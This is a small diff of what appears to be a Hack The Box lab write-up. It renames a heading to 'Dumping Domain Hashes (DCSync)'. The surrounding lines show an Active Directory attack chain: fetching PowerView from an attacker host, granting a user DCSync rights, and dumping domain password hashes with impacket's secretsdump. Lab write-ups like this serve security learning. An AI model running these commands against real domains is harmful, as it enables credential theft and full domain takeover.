@@ -25,7 +25,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb.local\shaiiko'
 iwr http://10.10.14.177/PowerView.ps1 -OutFile PowerView.ps1
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity shaiiko -Rights DCSync
 ```
-Get HashLSM
+Dumping Domain Hashes (DCSync)
 ```
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/shaiiko@10.129.8.25
 ```
